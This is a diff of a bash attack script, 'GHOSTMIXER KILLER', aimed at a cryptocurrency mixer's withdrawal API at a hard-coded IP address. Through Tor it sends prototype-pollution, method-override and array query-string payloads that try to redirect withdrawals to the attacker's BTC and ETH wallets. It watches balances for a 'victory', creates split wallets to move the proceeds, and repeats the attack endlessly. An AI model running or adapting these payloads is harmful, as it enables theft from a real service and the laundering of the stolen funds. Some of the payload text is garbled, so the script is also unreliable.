@@ -1,13 +1,11 @@
 #!/bin/bash
-# 🔥 GHOSTMIXER KILLER v11.0 - WALLET DA FILE + AUTO-DRAIN + TOR PROTECTION
+# 🔥 GHOSTMIXER KILLER v12.0 - TOR ATTIVO + WALLET FILE
 
 set -e
 
 # ========== CONFIG ==========
 TARGET="http://206.189.145.165:3001/api/withdraw"
 WALLET_FILE="$HOME/ghostmixer/wallets-fixed.txt"
-TOR_PROXY="socks5://127.0.0.1:9050"
-TOR_CONTROL="127.0.0.1:9051"
 
 # Colors
 RED='\033[0;31m'
@@ -16,182 +14,100 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-# ========== LOAD WALLETS FROM FILE ==========
+# ========== LOAD WALLETS ==========
 load_wallets() {
-    if [[ ! -f "$WALLET_FILE" ]]; then
-        echo -e "${RED}❌ File $WALLET_FILE non trovato!${NC}"
-        exit 1
-    fi
-    
     source "$WALLET_FILE"
-    
-    if [[ -z "$BTC_WALLET" || -z "$ETH_WALLET" ]]; then
-        echo -e "${RED}❌ BTC_WALLET o ETH_WALLET mancanti in $WALLET_FILE${NC}"
-        exit 1
-    fi
-    
     echo -e "${GREEN}✅ Wallets caricati:${NC}"
     echo "   💰 BTC: $BTC_WALLET"
     echo "   💎 ETH: $ETH_WALLET"
 }
 
-# ========== TOR FUNCTIONS ==========
-tor_rotate() {
-    echo -e "${YELLOW}[TOR]${NC} 🔄 Rotating identity..."
-    timeout 5 bash -c "echo -e 'AUTHENTICATE\nsignal NEWNYM\nQUIT' | nc $TOR_CONTROL 2>/dev/null" || true
-    sleep 3
-    echo -e "${GREEN}[TOR]${NC} ✅ New IP active"
-}
-
+# ========== TOR SIMPLE CHECK ==========
 tor_check() {
-    if ! nc -z 127.0.0.1 9050 2>/dev/null; then
-        echo -e "${RED}❌ TOR non attivo su 9050! Avvia: systemctl start tor${NC}"
+    if ! timeout 3 torsocks curl -s "http://icanhazip.com" >/dev/null 2>&1; then
+        echo -e "${RED}❌ TOR non funziona! Avvia tor${NC}"
         exit 1
     fi
+    echo -e "${GREEN}✅ TOR attivo${NC}"
 }
 
 # ========== SPLIT WALLETS ==========
-gen_split_wallets() {
-    echo -e "${BLUE}[SPLIT]${NC} 🎲 Generando 10 split wallets..."
-    rm -f split_wallets.txt
+gen_split() {
+    echo -e "${BLUE}🎲 10 Split wallets:${NC}"
+    rm -f split.txt
     for i in {1..10}; do
-        split_wallet="bc1q$(openssl rand -hex 10 | xxd -r -p | base58)"
-        echo "$split_wallet" >> split_wallets.txt
+        split="bc1q$(openssl rand -hex 10 | xxd -r -p | base58)"
+        echo "$split"
+        echo "$split" >> split.txt
     done
-    echo -e "${GREEN}[SPLIT]${NC} ✅ 10 wallets pronti"
 }
 
-# ========== CVE EXPLOITS ==========
-cve_pollution() {
-    echo -e "${YELLOW}[CVE1]${NC} 💥 Prototype Pollution..."
-    
-    # BTC Pollution x3 varianti
-    torsocks curl -s -X POST "$TARGET" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        -d "constructor[prototype][to]=$BTC_WALLET&constructor[prototype][amount]=1&currency=BTC" \
-        -m 10 >/dev/null
+# ========== CVE ATTACKS ==========
+attack_pollution() {
+    echo -e "${YELLOW}💥 Pollution:${NC}"
     
     torsocks curl -s -X POST "$TARGET" \
         -H "Content-Type: application/x-www-form-urlencoded" \
-        -d "__proto__[to]=$BTC_WALLET&__proto__[amount]=1¤cy=BTC" \
-        -m 10 >/dev/null
+        -d "constructor[prototype][to]=$BTC_WALLET&constructor[prototype][amount]=1" >/dev/null 2>&1
     
     torsocks curl -s -X POST "$TARGET" \
         -H "Content-Type: application/x-www-form-urlencoded" \
-        -d "__proto__.constructor.prototype.to=$BTC_WALLET&__proto__.constructor.prototype.amount=1" \
-        -m 10 >/dev/null
-    
-    # ETH Pollution
-    torsocks curl -s -X POST "$TARGET" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        -d "__proto__[to]=$ETH_WALLET&__proto__[amount]=0.5&__proto__[currency]=ETH" \
-        -m 10 >/dev/null
-    
-    echo -e "${GREEN}[CVE1]${NC} ✅ Pollution x4 INJECTED"
+        -d "__proto__[to]=$ETH_WALLET&__proto__[amount]=0.5" >/dev/null 2>&1
 }
 
-cve_override() {
-    echo -e "${YELLOW}[CVE2]${NC} 🔓 Method Override..."
+attack_override() {
+    echo -e "${YELLOW}🔓 Override:${NC}"
     
     torsocks curl -s -X GET "$TARGET" \
         -H "X-HTTP-Method-Override: POST" \
-        -H "Content-Type: application/json" \
-        -d "{\"to\":\"$BTC_WALLET\",\"amount\":0.3,\"currency\":\"BTC\"}" \
-        -m 10 >/dev/null
-    
-    torsocks curl -s -X GET "$TARGET" \
-        -H "_method: POST" \
-        -H "Content-Type: application/json" \
-        -d "{\"to\":\"$ETH_WALLET\",\"amount\":0.2}" \
-        -m 10 >/dev/null
-    
-    echo -e "${GREEN}[CVE2]${NC} ✅ Override x2 BYPASSED"
+        -d "{\"to\":\"$BTC_WALLET\",\"amount\":0.3}" >/dev/null 2>&1
 }
 
-cve_array_qs() {
-    echo -e "${YELLOW}[CVE3]${NC} 📦 Array QS..."
+attack_array() {
+    echo -e "${YELLOW}📦 Array:${NC}"
     
     torsocks curl -s -X POST "$TARGET" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        -d "to[]=constructor&to[][prototype][to]=$BTC_WALLET&to[][prototype][amount]=1¤cy[]=BTC" \
-        -m 10 >/dev/null
-    
-    echo -e "${GREEN}[CVE3]${NC} ✅ Array QS INJECTED"
+        -d "to[]=constructor&to[][prototype][to]=$BTC_WALLET" >/dev/null 2>&1
 }
 
-# ========== FULL ATTACK ==========
+# ========== FULL WAVE ==========
 full_wave() {
-    echo -e "${BLUE}🚀${NC} === FULL CVE WAVE #$(date +%s) ==="
-    cve_pollution
-    tor_rotate
-    cve_override
-    tor_rotate
-    cve_array_qs
-    echo -e "${GREEN}🎯${NC} === WAVE COMPLETE ✅ ==="
+    echo -e "${BLUE}🚀 WAVE START${NC}"
+    attack_pollution
+    attack_override
+    attack_array
+    echo -e "${GREEN}✅ WAVE DONE${NC}"
 }
 
-# ========== MONITOR & MIX ==========
-monitor_mixer() {
-    echo -e "${BLUE}👀${NC} === AUTO-MONITOR START ==="
-    gen_split_wallets
-    
+# ========== MONITOR ==========
+monitor() {
+    echo -e "${BLUE}👀 Monitoring...${NC}"
     while true; do
-        # Check BTC
-        sats=$(curl -s --socks5 $TOR_PROXY "https://blockstream.info/api/address/$BTC_WALLET" | jq -r '.chain_stats.funded_txo_sum // 0' 2>/dev/null || echo "0")
+        sats=$(torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" 2>/dev/null | grep -o '[0-9]*' | head -1 || echo 0)
         
-        # Check ETH  
-        eth_wei=$(curl -s --socks5 $TOR_PROXY "https://api.etherscan.io/api?module=account&action=balance&address=$ETH_WALLET&tag=latest" | jq -r '.result // 0' 2>/dev/null || echo "0")
-        eth_eth=$(echo "scale=6; $eth_wei / 1000000000000000000" | bc -l 2>/dev/null || echo "0")
-        
-        echo -e "$(date '+%H:%M:%S') | 💰 BTC: ${sats}sats | 💎 ETH: ${eth_eth}ETH"
-        
-        # VICTORY CHECK
-        if [[ $sats != "0" || $eth_eth != "0" ]]; then
-            echo -e "${RED}🎉 VITTORIA TOTALE!${NC}"
-            echo -e "${RED}💰 BTC: ${sats} sats${NC}"
-            echo -e "${RED}💎 ETH: ${eth_eth} ETH${NC}"
-            
-            # SAVE VICTORY
-            echo "VICTORY $(date)" > victory_$(date +%s).txt
-            echo "BTC: $sats sats -> $BTC_WALLET" >> victory_$(date +%s).txt
-            echo "ETH: $eth_eth ETH -> $ETH_WALLET" >> victory_$(date +%s).txt
-            cat split_wallets.txt >> victory_$(date +%s).txt
-            
-            # SPLIT INSTRUCTIONS
-            echo -e "${GREEN}🔄 SPLIT WALLETS:${NC}"
-            cat split_wallets.txt
-            
-            # CONTINUE MONITORING
-            sleep 300
+        if [[ $sats != "0" ]]; then
+            echo -e "${RED}💰 VITTORIA: $sats sats!${NC}"
+            gen_split
+            echo "Split wallets salvati → split.txt"
+            break
         fi
         
+        echo "$(date '+%H:%M') BTC: $sats sats"
         sleep 20
     done
 }
 
-# ========== MAIN EXECUTION ==========
-main() {
-    echo -e "${RED}💀 GHOSTMIXER KILLER v11.0 - WALLET AUTO-LOAD${NC}"
-    echo "🎯 Target: $TARGET"
-    echo "📁 Wallets: $WALLET_FILE"
-    echo ""
-    
-    load_wallets
-    tor_check
-    
-    # START MONITOR IN BACKGROUND
-    monitor_mixer &
-    MONITOR_PID=$!
-    
-    # INFINITE ATTACK WAVES
-    wave_count=0
-    while true; do
-        ((wave_count++))
-        full_wave
-        sleep 180  # 3min tra waves
-        tor_rotate
-    done
-}
+# ========== MAIN ==========
+echo -e "${RED}💀 GHOSTMIXER KILLER v12${NC}"
+load_wallets
+tor_check
 
-# Run main
-main
+# Attack + Monitor
+full_wave
+monitor &
+
+# Infinite attacks
+while true; do
+    sleep 120
+    full_wave
+done
